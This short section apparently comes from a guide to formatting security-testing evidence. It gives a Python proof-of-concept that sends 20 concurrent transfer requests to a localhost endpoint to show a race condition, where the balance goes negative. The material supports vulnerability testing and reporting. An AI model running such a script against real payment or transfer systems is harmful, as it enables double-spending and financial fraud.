# Race Conditions

**Preferred format:** Concurrent request script with timing evidence

```python
import threading
import requests

TARGET = "http://localhost:8080"
results = []

def make_request():
    resp = requests.post(f"{TARGET}/transfer", json={"amount": 100})
    results.append(resp.json())

# Fire N concurrent requests to trigger TOCTOU
threads = [threading.Thread(target=make_request) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Analyze results — if total transferred exceeds balance, race condition confirmed
total = sum(r.get("transferred", 0) for r in results)
print(f"[*] Total transferred: {total} (balance was 100)")
if total > 100:
    print("[+] Race condition confirmed — balance went negative")
```

Include the expected vs actual state as evidence.
